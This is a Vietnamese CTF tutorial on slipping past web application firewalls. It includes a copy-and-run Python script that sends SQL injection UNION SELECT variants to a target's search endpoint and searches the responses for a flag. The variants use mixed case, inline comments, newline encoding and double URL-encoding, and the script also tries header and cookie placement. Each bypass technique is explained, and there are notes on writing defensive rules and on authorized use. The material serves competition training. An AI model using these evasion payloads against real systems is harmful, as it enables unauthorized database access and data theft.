# WAF Bypass (né tường lửa web ngay từ đầu, bằng nhiều kiểu viết payload khác nhau)

Tường lửa web (gọi tắt WAF — 1 lớp lọc tự động đứng chắn trước server thật) chặn request dựa vào việc "thấy giống chữ nguy hiểm" — ví dụ thấy chữ `UNION SELECT` trong URL là chặn ngay. Nhưng WAF chỉ so khớp kiểu máy móc (giống tìm-kiếm-và-thay-thế), không hiểu Ý NGHĨA THẬT như database/server thật hiểu. Vì vậy có nhiều cách VIẾT KHÁC đi mà database vẫn hiểu đúng ý đồ cũ (ví dụ vẫn là lệnh SQL nguy hiểm) nhưng WAF lại không nhận ra nó là cùng 1 thứ — đổi hoa/thường, chèn khoảng trắng/comment xen giữa, đổi cách encode, đổi vị trí gửi payload (header/cookie thay vì URL).

**Bài này khác bài [`06_Debug/04_Khi_Gap_WAF_403.md`](../06_Debug/04_Khi_Gap_WAF_403.md):** bài đó là "debug khi request của mình đột nhiên bị 403, tìm xem WAF chặn theo cái gì" (từng thứ một: User-Agent, định dạng body, cách encode URL). Bài này là "thử SẴN 1 loạt biến thể payload khác nhau cùng lúc, qua vòng lặp, để tăng khả năng có ít nhất 1 biến thể lọt qua" — dùng khi bạn đã biết chắc có WAF và cần né nhiều kiểu rule cùng lúc, không chỉ dò nguyên nhân.

Trên Burp bạn nhận ra lỗi này khi: payload chuẩn (ví dụ `' OR 1=1`) bị trả về 403 với 1 trang lỗi riêng biệt (không phải lỗi app thường thấy, kiểu "Request blocked by security policy"), nhưng request không có payload gì vẫn qua bình thường — nghĩa là có WAF đang lọc theo nội dung, không chặn toàn bộ.

## Snippet copy-là-chạy

```python
import re
import requests
from urllib.parse import quote

base = "http://target"
FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

def solve_one(session, base_url):
    url = f"{base_url}/search"

    # Danh sách biến thể của CÙNG 1 payload gốc (ví dụ SQLi) -- mỗi biến thể né 1 kiểu rule khác nhau.
    # Payload gốc giả định: ' UNION SELECT 1,2,3-- -
    variants = [
        "' UNION SELECT 1,2,3-- -",                     # payload gốc, dùng để xác nhận có đang bị chặn hay không
        "' UnIoN SeLeCt 1,2,3-- -",                      # 1) đổi hoa/thường -- SQL không phân biệt hoa thường
        "' UNION/**/SELECT 1,2,3-- -",                   # 2) chèn comment SQL giữa 2 từ khoá
        "' UNION%0aSELECT 1,2,3-- -",                    # 3) dùng xuống dòng thay khoảng trắng
        quote("' UNION SELECT 1,2,3-- -"),               # 4) URL-encode cả payload 1 lớp
        quote(quote("' UNION SELECT 1,2,3-- -")),        # 5) URL-encode 2 lớp (double-encode)
    ]

    for payload in variants:
        try:
            # Thử ở query string trước
            r = session.get(url, params={"q": payload}, timeout=5)
            print(repr(payload)[:60], "-> status", r.status_code)
            if r.status_code == 200:
                m = FLAG_RE.search(r.text)
                if m:
                    return m.group(0)
                print("  -> qua được WAF (status 200), nhưng chưa thấy flag -- xem r.text để đi tiếp")
        except requests.RequestException as e:
            print("lỗi gửi request:", e)

    # Nếu không biến thể nào ở query string lọt qua, thử đổi VỊ TRÍ: gửi qua header/cookie
    for payload in variants:
        try:
            r = session.get(url, headers={"X-Search": payload}, cookies={"search": payload}, timeout=5)
            if r.status_code == 200 and FLAG_RE.search(r.text):
                return FLAG_RE.search(r.text).group(0)
        except requests.RequestException:
            pass

    return None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- `variants` là 1 list chứa NHIỀU CÁCH VIẾT khác nhau của cùng 1 payload gốc — vòng `for` thử lần lượt từng cái, in ra status để bạn biết cái nào qua được (status khác 403, thường là 200).
- Hoa/thường (`UnIoN SeLeCt`): nếu WAF viết rule theo kiểu so khớp chữ thường tuyệt đối (không có cờ "không phân biệt hoa thường"), chỉ cần đổi vài chữ hoa là né được, mà SQL vẫn hiểu đúng y hệt.
- Comment `/**/` chèn giữa 2 từ khoá: với SQL, `/**/` chỉ là ghi chú bị bỏ qua khi chạy, không ảnh hưởng gì tới câu lệnh, nhưng WAF nếu chỉ tìm đúng chuỗi liền `UNION SELECT` (không tính trường hợp có gì chèn giữa) sẽ không nhận ra.
- `%0a` (ký tự xuống dòng đã encode) thay cho dấu cách: nhiều rule WAF chỉ coi dấu cách thường (space) là khoảng trắng hợp lệ giữa từ khoá, không tính các ký tự trắng khác (tab, xuống dòng) — SQL/shell command thường chấp nhận cả các ký tự này.
- `quote(...)` (URL-encode) 1 lần hoặc 2 lần: nếu app TỰ GIẢI MÃ (decode) payload 2 lần nhưng WAF chỉ giải mã 1 lần trước khi so khớp, double-encode khiến WAF nhìn thấy 1 chuỗi vô hại còn app lại hiểu ra payload thật sau khi tự decode thêm 1 lần nữa.
- Đoạn cuối thử đổi VỊ TRÍ (header, cookie) vì nhiều rule WAF chỉ cấu hình soi query string/body, quên soi cookie hoặc header tuỳ chỉnh — nếu app có đọc giá trị từ đó, đây là đường né hoàn toàn khác nhóm "đổi cách viết".

## Lưu ý nhanh

- Luôn gửi payload GỐC (chưa biến đổi) trước để xác nhận đúng là có WAF chặn (403 với trang lỗi riêng) — tránh nhầm với lỗi app bình thường.
- Mỗi lần chỉ nên hiểu rõ biến thể nào THỰC SỰ cần thiết — nếu đổi nhiều thứ cùng lúc mà qua được, không biết chính xác kỹ thuật nào quan trọng, lần sau gặp WAF khác sẽ khó áp dụng lại.
- Nếu đang ở vai trò phòng thủ (viết rule chặn payload đối thủ), nhớ luật của giải: chặn theo PAYLOAD, không chặn theo IP, không chặn API phục vụ cờ (bị trừ điểm nặng hơn chặn nhầm thường), luôn bật chế độ chỉ-ghi-log trước khi chuyển sang chặn thật.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
